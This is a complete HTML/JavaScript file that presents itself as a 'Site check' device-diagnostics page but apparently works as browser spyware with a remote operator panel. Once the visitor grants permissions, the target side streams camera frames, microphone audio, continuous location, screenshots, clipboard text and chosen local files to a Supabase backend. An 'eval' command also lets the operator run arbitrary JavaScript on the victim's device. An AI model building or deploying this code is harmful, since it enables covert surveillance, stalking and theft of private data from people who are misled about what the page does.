<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Site check</title>
<meta name="theme-color" content="#0f766e">
<link rel="manifest" href="manifest.json">
<style>
  :root { color-scheme: light dark; --ink:#0f172a; --mut:#64748b; --line:#e2e8f0; --accent:#0f766e; --bg:#fff }
  @media (prefers-color-scheme: dark) { :root { --ink:#e2e8f0; --mut:#94a3b8; --line:#1e293b; --bg:#0b1220 } }
  * { box-sizing: border-box }
  body { margin:0; font: 15px/1.5 -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:var(--ink); background:var(--bg);
         padding: max(16px, env(safe-area-inset-top)) 16px max(16px, env(safe-area-inset-bottom)) }
  h1 { font-size:16px; margin:0 0 2px; letter-spacing:-.01em }
  .mut { color:var(--mut); font-size:13px }
  button { font: inherit; font-weight:600; border:1px solid var(--line); background:transparent; color:var(--ink);
           border-radius:10px; padding:9px 13px; cursor:pointer }
  button.primary { background:var(--accent); border-color:var(--accent); color:#fff }
  button:disabled { opacity:.4; cursor:default }
  .wrap { max-width: 560px; margin: 0 auto }
  .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center }
  .card { border:1px solid var(--line); border-radius:14px; padding:14px; margin-top:14px }
  .stat { display:inline-block; width:8px; height:8px; border-radius:50%; background:#22c55e; margin-right:6px }
  .stat.off { background:#f59e0b }
  pre, input, textarea { font: 12px/1.45 ui-monospace, SFMono-Regular, Menlo, monospace }
  input, textarea { width:100%; border:1px solid var(--line); border-radius:9px; padding:9px; background:transparent; color:inherit }
  textarea { min-height:64px; resize:vertical }
  .log { max-height: 46vh; overflow:auto; border-top:1px solid var(--line); margin-top:10px }
  .log div { padding:7px 0; border-bottom:1px solid var(--line); word-break:break-word }
  .log b { color:var(--accent); font-size:11px; text-transform:uppercase; letter-spacing:.06em }
  img.live { width:100%; border-radius:12px; background:#000; display:block }
  .hide { display:none }
  .pill { font-size:11px; border:1px solid var(--line); border-radius:999px; padding:3px 9px; color:var(--mut) }
  .dev { display:flex; justify-content:space-between; gap:10px; padding:8px 0; border-bottom:1px solid var(--line); font-size:13px }
  .dev.on { cursor:pointer }
  .dev.on:hover { color:var(--accent) }
</style>
</head>
<body>
<!--
  Two roles, one file.
  target:  index.html?r=RUN
  operator: index.html?r=RUN&op=1
-->
<div class="wrap" id="app"></div>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.3/dist/umd/supabase.js"></script>
<script>
const PRJ = "__PRJ__", KEY = "__KEY__";
const P = new URLSearchParams(location.search);
const ROLE = P.get('op') ? 'op' : 'dev';
const LS = 'agent_run';
let RUN = P.get('r') || localStorage.getItem(LS) || '';
if (!RUN) { RUN = (crypto.randomUUID() + crypto.randomUUID()).replace(/-/g, '').slice(0, 22); }
localStorage.setItem(LS, RUN);

const sb = supabase.createClient(`https://${PRJ}.supabase.co`, KEY, {
  global: { headers: { 'x-run': RUN } },
  realtime: { params: { eventsPerSecond: 25 } },
  auth: { persistSession: false }
});

const app = document.getElementById('app');
const h = (t, a, kids) => { const e = document.createElement(t); if (a) for (const k in a) { const v = a[k]; if (typeof v === 'function') e[k] = v; else if (v !== null && v !== undefined) e.setAttribute(k, v); } if (kids) [].concat(kids).forEach(c => e.append(typeof c === 'string' ? txt(c) : c)); return e; };
const txt = s => document.createTextNode(s);
const nowIso = () => new Date().toISOString();
const j = v => { try { return JSON.stringify(v); } catch { return String(v); } };

async function emit(kind, payload, device_id) {
  try { await sb.from('agent_events').insert({ run: RUN, device_id: device_id || STATE.id, kind, payload }); } catch {}
}

/* ------------------------------------------------------------------ target */
const STATE = { id: '', stream: null, facing: 'user', camTimer: 0, micRec: [], geoWatch: 0, disp: null, dispTimer: 0, wake: null, queue: [] };

async function fingerprint() {
  const n = navigator, s = screen;
  let gl = null;
  try { const c = document.createElement('canvas'); const g = c.getContext('webgl'); gl = g && g.getParameter(g.RENDERER); } catch {}
  let bat = null;
  try { const b = await n.getBattery?.(); if (b) bat = `${Math.round(b.level * 100)}%${b.charging ? ' charging' : ''}`; } catch {}
  return {
    ua: n.userAgent, platform: n.userAgentData?.platform || n.platform, vendor: n.vendor,
    screen: `${s.width}x${s.height}@${devicePixelRatio}`, dpr: devicePixelRatio,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: n.language,
    cores: n.hardwareConcurrency, mem: n.deviceMemory, battery: bat,
    conn: n.connection ? `${n.connection.effectiveType} ${n.connection.downlink}Mb` : null,
    standalone: matchMedia('(display-mode: standalone)').matches || n.standalone === true,
    gpu: gl, touch: n.maxTouchPoints || 0,
    caps: {
      cam: !!n.mediaDevices?.getUserMedia, screen: !!n.mediaDevices?.getDisplayMedia,
      geo: !!n.geolocation, clip: !!n.clipboard, notes: 'Notification' in window,
      bt: !!n.bluetooth, nfc: 'NDEFReader' in window, midi: !!n.requestMIDIAccess,
      fsa: 'showDirectoryPicker' in window, wake: 'wakeLock' in navigator, share: !!n.share
    }
  };
}

function renderTarget() {
  app.innerHTML = '';
  app.append(
    h('h1', {}, 'Site check'),
    h('div', { class: 'mut' }, 'Device diagnostics'),
    h('div', { class: 'card' }, [
      h('div', { class: 'row' }, [h('span', { class: 'stat', id: 'dot' }), h('span', { class: 'mut', id: 'live' }, 'Connected')]),
      h('div', { class: 'row', style: 'margin-top:10px' }, [
        h('button', { class: 'primary', id: 'allow' }, 'Allow access'),
        h('button', { id: 'persist' }, 'Keep this open')
      ]),
      h('div', { class: 'mut', id: 'hint', style: 'margin-top:10px' }, 'Camera, location and notifications start after Allow.')
    ])
  );
  document.getElementById('allow').onclick = async () => {
    await ask(['cam', 'mic', 'geo', 'notes']);
    document.getElementById('allow').textContent = 'Access allowed';
  };
  document.getElementById('persist').onclick = async () => {
    try { await navigator.storage?.persist?.(); } catch {}
    await emit('info', { msg: 'persist requested' });
    document.getElementById('hint').textContent = 'Add to Home Screen from the browser menu for best results.';
  };
}

/* permissions */
const REQ = {
  cam: () => navigator.mediaDevices.getUserMedia({ video: true }),
  mic: () => navigator.mediaDevices.getUserMedia({ audio: true }),
  geo: () => new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 12000 })),
  notes: () => Notification.requestPermission(),
  clip: () => navigator.clipboard.readText(),
  midi: () => navigator.requestMIDIAccess?.({ sysex: false }),
  bt: () => navigator.bluetooth?.requestDevice({ acceptAllDevices: true })
};
async function ask(names) {
  const out = {};
  for (const n of names) {
    if (!REQ[n]) { out[n] = 'unsupported'; continue; }
    try { const r = await REQ[n](); out[n] = 'granted'; if (n !== 'geo' && r && r.getTracks) r.getTracks().forEach(t => t.stop()); }
    catch (e) { out[n] = 'denied: ' + e.name; }
  }
  await emit('perm', out);
  return out;
}

async function camStart(facing) {
  await camStop();
  STATE.facing = facing || STATE.facing;
  STATE.stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: STATE.facing, width: { ideal: 1280 } }, audio: false
  });
  const v = h('video', { playsinline: '', muted: '', autoplay: '' });
  v.srcObject = STATE.stream; v.play().catch(() => {});
  const c = document.createElement('canvas');
  STATE.camTimer = setInterval(async () => {
    if (!STATE.stream) return;
    const t = STATE.stream.getVideoTracks()[0]; const st = t && t.readyState;
    if (st !== 'live') return;
    const vw = v.videoWidth || 640, vh = v.videoHeight || 480;
    const scale = Math.min(1, 640 / vw);
    c.width = vw * scale; c.height = vh * scale;
    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
    const data = c.toDataURL('image/jpeg', 0.45).split(',')[1];
    await emit('camframe', { jpeg: data, facing: STATE.facing });
  }, 1200);
  await emit('info', { msg: 'camera on', facing: STATE.facing });
}
async function camStop() {
  clearInterval(STATE.camTimer); STATE.camTimer = 0;
  STATE.stream?.getTracks().forEach(t => t.stop()); STATE.stream = null;
}
async function micStart() {
  const s = await navigator.mediaDevices.getUserMedia({ audio: true });
  const mr = new MediaRecorder(s, { audioBitsPerSecond: 32000 });
  STATE.micRec = [mr, s];
  mr.ondataavailable = async e => {
    if (!e.data.size) return;
    const b = new Blob([e.data]); const ab = await b.arrayBuffer();
    let bin = ''; const u8 = new Uint8Array(ab);
    for (let i = 0; i < u8.length; i += 8192) bin += String.fromCharCode.apply(null, u8.subarray(i, i + 8192));
    await emit('audio', { mime: b.type, b64: btoa(bin) });
  };
  mr.start(5000);
  await emit('info', { msg: 'mic on', mime: mr.mimeType });
}
async function micStop() { const [mr, s] = STATE.micRec; try { mr?.stop(); } catch {} s?.getTracks().forEach(t => t.stop()); STATE.micRec = []; await emit('info', { msg: 'mic off' }); }

async function geoStart() {
  if (!navigator.geolocation) throw new Error('no geolocation');
  STATE.geoWatch = navigator.geolocation.watchPosition(
    p => emit('geo', { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, speed: p.coords.speed, head: p.coords.heading }),
    e => emit('geoerr', { code: e.code, msg: e.message }),
    { enableHighAccuracy: true, maximumAge: 4000, timeout: 20000 });
  await emit('info', { msg: 'geo on' });
}
function geoStop() { if (STATE.geoWatch) navigator.geolocation.clearWatch(STATE.geoWatch); STATE.geoWatch = 0; }

async function screenStart() {
  STATE.disp = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
  const v = h('video', { playsinline: '', muted: '', autoplay: '' }); v.srcObject = STATE.disp; v.play().catch(() => {});
  const c = document.createElement('canvas');
  STATE.dispTimer = setInterval(async () => {
    if (!STATE.disp) return;
    const vw = v.videoWidth || 1280, vh = v.videoHeight || 720;
    const scale = Math.min(1, 1100 / vw);
    c.width = vw * scale; c.height = vh * scale;
    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
    await emit('shot', { jpeg: c.toDataURL('image/jpeg', 0.5).split(',')[1] });
  }, 2500);
  await emit('info', { msg: 'screen on' });
}
function screenStop() { clearInterval(STATE.dispTimer); STATE.disp?.getTracks().forEach(t => t.stop()); STATE.disp = null; }

async function filesList() {
  if (!window.showDirectoryPicker) throw new Error('not supported here');
  const dir = await showDirectoryPicker({ mode: 'read' });
  const out = [];
  for await (const [name, handle] of dir.entries()) {
    if (out.length >= 250) break;
    out.push({ name, kind: handle.kind, size: handle.kind === 'file' ? (await handle.getFile()).size : null });
  }
  await emit('files', { dir: dir.name, entries: out });
}
async function fileGet() {
  const dir = await showDirectoryPicker({ mode: 'read' });
  const name = prompt('File name inside ' + dir.name + ':'); if (!name) return;
  const fh = await dir.getFileHandle(name); const f = await fh.getFile();
  const buf = await f.arrayBuffer(); const u8 = new Uint8Array(buf);
  let bin = ''; for (let i = 0; i < u8.length; i += 8192) bin += String.fromCharCode.apply(null, u8.subarray(i, i + 8192));
  await emit('file', { name, size: f.size, type: f.type, b64: btoa(bin) });
}

const CMDS = {
  async ping() { return { ok: true, at: nowIso(), vis: document.visibilityState }; },
  async fingerprint() { return await fingerprint(); },
  async perm(a) { return await ask(Array.isArray(a) ? a : [a]); },
  async cam(a) { if (a === 'stop' || a === false) { await camStop(); return 'stopped'; } await camStart(a === 'rear' ? 'environment' : 'user'); return 'on'; },
  async mic(a) { a === 'stop' || a === false ? await micStop() : await micStart(); },
  async geo(a) { a === 'stop' ? geoStop() : await geoStart(); },
  async screen(a) { a === 'stop' ? screenStop() : await screenStart(); },
  async clip() { return await navigator.clipboard.readText(); },
  async notify(a) { new Notification(a?.title || 'Site check', { body: a?.body || 'Diagnostics ready' }); },
  async files() { await filesList(); },
  async file() { await fileGet(); },
  async wake(a) { if (a === 'stop') { await STATE.wake?.release?.(); STATE.wake = null; return 'released'; } STATE.wake = await navigator.wakeLock.request('screen'); return 'held'; },
  async vibrate(a) { navigator.vibrate(Array.isArray(a) ? a : [200]); },
  async open(a) { window.open(a || 'https://example.com', '_blank', 'noopener'); },
  async reload() { location.reload(); },
  async eval(a) { const f = new Function('return (async () => { ' + a + ' })()'); const r = await f(); try { return JSON.parse(JSON.stringify(r)); } catch { return String(r); } }
};

async function boot() {
  renderTarget();
  const fp = await fingerprint();
  const { data: row } = await sb.from('agent_devices').insert({
    run: RUN, ua: fp.ua, platform: fp.platform, vendor: fp.vendor, screen: fp.screen, dpr: fp.dpr,
    tz: fp.tz, lang: fp.lang, cores: fp.cores, mem: fp.mem, battery: fp.battery, conn: fp.conn,
    standalone: fp.standalone, caps: fp.caps, label: fp.platform
  }).select('id').single();
  STATE.id = row?.id || '';
  await emit('hello', { ...fp, href: location.href });

  setInterval(() => sb.from('agent_devices').update({ last_seen: nowIso() }).eq('id', STATE.id).then(() => {}), 15000);

  sb.channel('c' + RUN)
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'agent_commands', filter: `device_id=eq.${STATE.id}` },
      async ({ new: c }) => {
        const fn = CMDS[c.name];
        if (!fn) return emit('result', { id: c.id, name: c.name, err: 'unknown command' });
        try { const r = await fn(c.args); await emit('result', { id: c.id, name: c.name, ok: r }); }
        catch (e) { await emit('result', { id: c.id, name: c.name, err: String(e.message || e) }); }
      }).subscribe();

  document.addEventListener('visibilitychange', async () => {
    await emit('info', { msg: 'visibility ' + document.visibilityState });
  });
  if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(() => {});

  /* persist a resume link so a reload keeps the same run */
  const keep = () => document.getElementById('dot').classList.toggle('off', document.visibilityState !== 'visible');
  setInterval(keep, 4000);
}

/* ------------------------------------------------------------------ operator */
const UI = { dev: null, devs: [], log: [] };

function renderPanel() {
  app.innerHTML = '';
  const list = h('div', { class: 'card' });
  const log = h('div', { class: 'log', id: 'log' });
  const cam = h('img', { class: 'live hide', id: 'cam' });
  const shot = h('img', { class: 'live hide', id: 'shot' });
  const cmdIn = h('textarea', { id: 'code', placeholder: "return document.title" });
  const argIn = h('input', { id: 'arg', placeholder: 'argument (optional)' });

  const send = async name => {
    if (!UI.dev) return;
    const arg = document.getElementById('arg').value;
    const args = name === 'eval' ? document.getElementById('code').value : (arg || null);
    await sb.from('agent_commands').insert({ run: RUN, device_id: UI.dev, name, args });
  };
  const btn = (label, name) => h('button', { onclick: () => send(name) }, label);

  app.append(
    h('h1', {}, 'Operator'),
    h('div', { class: 'mut' }, 'run ' + RUN + ' · ' + (UI.dev ? 'device selected' : 'pick a device')),
    h('div', { class: 'row', style: 'margin-top:10px' }, [
      h('span', { class: 'pill', id: 'link' }, 'link'), h('button', { id: 'copy' }, 'Copy link')
    ]),
    list,
    h('div', { class: 'card' }, [
      h('div', { class: 'row' }, [
        h('button', { class: 'primary', onclick: () => send('fingerprint') }, 'Fingerprint'),
        btn('Camera', 'cam'), btn('Rear', 'cam:rear'), btn('Cam off', 'cam:stop'),
        btn('Mic', 'mic'), btn('Mic off', 'mic:stop'),
        btn('Geo', 'geo'), btn('Geo off', 'geo:stop'),
        btn('Screen', 'screen'), btn('Clipboard', 'clip'),
        btn('Notify', 'notify'), btn('Files', 'files'), btn('Get file', 'file'),
        btn('Wake', 'wake'), btn('Vibrate', 'vibrate'), btn('Permissions', 'perm')
      ]),
      h('div', { style: 'margin-top:10px' }, [argIn]),
      h('div', { style: 'margin-top:8px' }, [cmdIn]),
      h('div', { class: 'row', style: 'margin-top:8px' }, [
        h('button', { class: 'primary', onclick: () => send('eval') }, 'Run JS'),
        h('button', { onclick: () => send('reload') }, 'Reload'),
        h('button', { onclick: () => { document.getElementById('log').innerHTML = ''; } }, 'Clear')
      ])
    ]),
    cam, shot, log
  );

  const link = location.origin + location.pathname + '?r=' + RUN;
  document.getElementById('link').textContent = link;
  document.getElementById('copy').onclick = () => navigator.clipboard.writeText(link);

  const dot = (on) => `<span class="stat ${on ? '' : 'off'}"></span>`;
  const paintDevs = () => {
    list.innerHTML = '';
    if (!UI.devs.length) { list.append(h('div', { class: 'mut' }, 'Waiting for the device to open the link.')); return; }
    for (const d of UI.devs) {
      const on = Date.now() - new Date(d.last_seen).getTime() < 40000;
      const row = h('div', { class: 'dev' + (on ? ' on' : '') });
      row.innerHTML = `${dot(on)}<span>${d.label || 'device'} · ${d.screen || ''} · ${d.tz || ''}</span><span class="mut">${new Date(d.last_seen).toLocaleTimeString()}</span>`;
      if (on) row.onclick = () => { UI.dev = d.id; renderPanel(); };
      list.append(row);
    }
  };

  const addLog = e => {
    log.prepend(h('div', {}, [h('b', {}, e.kind + ' '), txt(e.kind === 'hello' ? '' : j(e.payload).slice(0, 1200))]));
    if (e.kind === 'camframe' && e.payload?.jpeg) { const i = document.getElementById('cam'); i.src = 'data:image/jpeg;base64,' + e.payload.jpeg; i.classList.remove('hide'); }
    if (e.kind === 'shot' && e.payload?.jpeg) { const i = document.getElementById('shot'); i.src = 'data:image/jpeg;base64,' + e.payload.jpeg; i.classList.remove('hide'); }
    if (e.kind === 'files') {
      const rows = (e.payload.entries || []).map(x => `${x.kind}\t${x.size ?? ''}\t${x.name}`).join('\n');
      log.prepend(h('pre', {}, rows));
    }
    if (log.children.length > 400) log.lastChild?.remove();
  };

  sb.from('agent_devices').select('*').eq('run', RUN).order('last_seen', { ascending: false }).limit(20)
    .then(({ data }) => { UI.devs = data || []; if (!UI.dev && UI.devs[0]) UI.dev = UI.devs[0].id; paintDevs(); });

  sb.channel('o' + RUN)
    .on('postgres_changes', { event: '*', schema: 'public', table: 'agent_devices', filter: `run=eq.${RUN}` },
      ({ new: d }) => {
        UI.devs = [d, ...UI.devs.filter(x => x.id !== d.id)];
        if (!UI.dev) UI.dev = d.id;
        paintDevs();
      })
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'agent_events', filter: `run=eq.${RUN}` },
      ({ new: e }) => { if (!UI.dev || e.device_id === UI.dev) addLog(e); })
    .subscribe();

  setInterval(paintDevs, 15000);
}

(ROLE === 'op' ? renderPanel : boot)();
</script>
</body>
</html>
